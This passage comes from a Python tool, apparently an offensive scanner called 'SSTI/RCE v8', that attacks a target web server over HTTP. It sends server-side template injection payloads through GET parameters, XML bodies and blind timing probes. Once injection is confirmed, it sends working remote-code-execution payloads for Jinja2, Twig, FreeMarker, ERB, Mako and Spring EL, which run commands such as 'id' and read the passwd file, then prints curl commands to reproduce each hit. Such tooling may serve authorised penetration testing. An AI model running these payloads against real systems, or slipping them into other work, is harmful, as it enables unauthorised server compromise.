                        extra={"payload": payload, "surface": "graphql"},
                    )
                    return

    # ── Surface 8: Blind timing-based RCE ────────────────────────────────────

    async def test_blind_timing(self, sess):
        print("\n[*] Testing blind timing-based RCE (sleep/ping)...")
        url = self.target + "/"

        for param in GET_PARAMS[:5]:
            # Baseline timing
            t0 = time.time()
            await self._get(sess, url, params={param: "safe_probe_baseline"})
            baseline = time.time() - t0
            await delay()

            for cmd_payload, expected_delay, label in BLIND_CMD_PROBES[:8]:
                for ssti_wrapper, _, engine in [
                    ("{{7*7}}", "49", "Jinja2"),
                    ("${7*7}", "49", "FreeMarker"),
                    ("<%=7*7%>", "49", "ERB"),
                ]:
                    # Wrap cmd inside common template expr
                    wrapped = ssti_wrapper.replace("7*7", cmd_payload)
                    t_start = time.time()
                    await self._get(sess, url, params={param: wrapped})
                    elapsed = time.time() - t_start
                    await delay()

                    delta = elapsed - baseline
                    if delta >= expected_delay * 0.85:
                        proof = (
                            f"GET {url}?{param}=<payload>\n"
                            f"  Payload: {wrapped!r}\n"
                            f"  Baseline response: {baseline:.2f}s\n"
                            f"  Injected response: {elapsed:.2f}s\n"
                            f"  Delay delta: {delta:.2f}s (expected ≥{expected_delay}s)\n"
                            f"  Engine hint: {engine} with cmd variant: {label}"
                        )
                        self._add(
                            ftype="BLIND_SSTI_RCE_TIMING",
                            severity="CRITICAL", conf=88,
                            proof=proof,
                            detail=f"Blind RCE via timing: sleep command caused {delta:.1f}s delay via SSTI wrapper. Engine hint: {engine}.",
                            url=f"{url}?{param}=<payload>", engine=engine,
                            reproducibility=(
                                f"time curl -s '{url}?{param}={quote(wrapped)}'\n"
                                f"# Expected response time: ~{expected_delay}s"
                            ),
                            extra={"cmd_variant": label, "delay_delta": round(delta, 2), "surface": "blind_timing"},
                        )
                        return

    # ── Surface 9: XML/SOAP injection ─────────────────────────────────────────

    async def test_xml_injection(self, sess):
        for endpoint in ["/api", "/soap", "/api/xml", "/api/v1", "/ws", "/service"]:
            url = self.target + endpoint
            for payload, expected, engine in SSTI_PROBES[:20]:
                xml_body = f"""<?xml version="1.0"?>
<request>
  <query>{payload}</query>
  <data>{payload}</data>
</request>"""
                s, body, _ = await self._post(
                    sess, url, data=xml_body,
                    headers={"Content-Type": "application/xml"},
                )
                await delay(0.05)
                if not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    proof = (
                        f"POST {url}\n"
                        f"  Content-Type: application/xml\n"
                        f"  XML body with SSTI payload in <query>/<data>\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s}"
                    )
                    self._add(
                        ftype="SSTI_XML_INJECTION",
                        severity=sev, conf=88,
                        proof=proof,
                        detail=f"SSTI via XML body at {endpoint}. Engine: {engine}.",
                        url=url, engine=engine,
                        reproducibility=f"curl -s -X POST {url} -H 'Content-Type: application/xml' -d '{xml_body[:200]}'",
                        extra={"payload": payload, "surface": "xml"},
                    )
                    return

    # ── RCE follow-up: extract real proof ────────────────────────────────────

    async def _attempt_rce_proof(self, sess, surface_fn, endpoint_or_url: str):
        """After SSTI confirmed, try to get real command output."""
        print("\n[*] Attempting RCE proof extraction (id, passwd, hostname)...")
        for cmd, indicators in RCE_PROOF_COMMANDS:
            rce_payloads = [
                # Jinja2
                f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
                f"{{{{lipsum.__globals__.os.popen('{cmd}').read()}}}}",
                f"{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
                # Twig
                f"{{{{['{cmd}']|filter('system')}}}}",
                f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{cmd}')}}}}",
                # FreeMarker
                f'${{"freemarker.template.utility.Execute"?new()("{cmd}")}}',
                # ERB
                f"<%= `{cmd}` %>",
                f"<%= IO.popen('{cmd}').read %>",
                # Mako
                f"<%! import os %><%=os.popen('{cmd}').read()%>",
                # Spring EL
                f"${{T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{{'/bin/sh','-c','{cmd}'}}).getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}}",
            ]
            for rce_payload in rce_payloads:
                for param in GET_PARAMS[:6]:
                    s, body, _ = await self._get(
                        sess, self.target + endpoint_or_url,
                        params={param: rce_payload},
                    )
                    await delay(0.05)
                    if body and any(ind in body for ind in indicators):
                        idx = next(body.find(ind) for ind in indicators if ind in body)
                        snippet = body[max(0, idx - 30): idx + 120]
                        self._add(
                            ftype="RCE_CONFIRMED",
                            severity="CRITICAL", conf=99,
                            proof=(
                                f"RCE PROOF — Command: {cmd!r}\n"
                                f"  URL: {self.target + endpoint_or_url}?{param}=<payload>\n"
                                f"  Payload: {rce_payload[:100]!r}\n"
                                f"  Output snippet: {snippet!r}"
                            ),
                            detail=f"CONFIRMED RCE: command '{cmd}' executed server-side. Output captured. Full server compromise.",
                            url=self.target + endpoint_or_url, engine=self._engine_confirmed or "Unknown",
                            reproducibility=(
                                f"curl -s '{self.target + endpoint_or_url}?{param}={quote(rce_payload)}'"
                            ),
                            extra={"command": cmd, "output_snippet": snippet, "surface": "rce_proof"},
                        )
                        return True
        return False

    # ── Discover injectable endpoints ──────────────────────────────────────────

    async def _discover_endpoints(self, sess) -> list[str]:
        live = []
        tasks = []
        for ep in API_ENDPOINTS_TO_PROBE:
            tasks.append(self._get(sess, self.target + ep))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for ep, res in zip(API_ENDPOINTS_TO_PROBE, results):
            if isinstance(res, Exception):
                continue
            status, body, _ = res
            if status not in (None, 404, 403) and body:
                live.append(ep)
        return live or ["/"]

    # ── Main ──────────────────────────────────────────────────────────────────

    async def run(self):
        print("=" * 60)
        print("  SSTI/RCE v8 — Massive Multi-Surface Scanner")
        print(f"  Target: {self.target}")
        print("=" * 60)

        conn = aiohttp.TCPConnector(limit=CONCURRENCY * 2, ssl=False)
        timeout = aiohttp.ClientTimeout(total=30, connect=8)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as sess:
            print("\n[*] Discovering live endpoints...")
            endpoints = await self._discover_endpoints(sess)
            print(f"    Found {len(endpoints)} candidate endpoint(s): {endpoints[:5]}")

            # Run all surface tests concurrently per endpoint
            tasks = []
            for ep in endpoints[:8]:
                tasks += [
                    self.test_get_params(sess, ep),
                    self.test_post_json(sess, ep),
                    self.test_post_form(sess, ep),
                ]
            tasks += [
                self.test_header_injection(sess),
                self.test_cookie_injection(sess),
                self.test_path_injection(sess),
                self.test_graphql_injection(sess),
                self.test_xml_injection(sess),
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

            # Blind timing test (sequential, timing-sensitive)
            await self.test_blind_timing(sess)

            # If SSTI confirmed, attempt real RCE proof
            if self.findings and self._engine_confirmed:
                ep = endpoints[0]
                await self._attempt_rce_proof(sess, "get", ep)

        rce_count = sum(1 for f in self.findings if "RCE" in f["type"])
        ssti_count = sum(1 for f in self.findings if "SSTI" in f["type"])
        print(f"\n[+] SSTI/RCE v8 complete: {len(self.findings)} findings "
              f"({rce_count} RCE confirmed, {ssti_count} SSTI)")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No ARSENAL_TARGET set.", file=sys.stderr)
        sys.exit(1)
    if not target.startswith("http"):
        target = "https://" + target
    scanner = SSTIScanner(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "ssti_rce.json"
    out.parent.mkdir(exist_ok=True)
    out.write_text(json.dumps(findings, indent=2, default=str))
    print(f"[+] Saved {len(findings)} findings → {out}")


if __name__ == "__main__":
    asyncio.run(main())
